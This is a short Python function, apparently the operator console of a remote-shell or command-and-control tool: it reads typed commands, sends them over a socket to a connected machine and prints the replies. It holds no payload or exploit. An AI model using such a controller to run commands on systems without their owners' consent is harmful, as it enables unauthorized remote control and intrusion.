

def runCommand(serverSocket):
    print("[+] Running command")
    NOT_RUNNING_COMMANDs = ['', " ", "  "]
    while True:
        command = input(">> ")
        
        if command not in NOT_RUNNING_COMMANDs:
            serverSocket.SendData(command)
            
            if command == "exit()":
                break
            result = serverSocket.ReceiveData()
            
            print(result)
        
    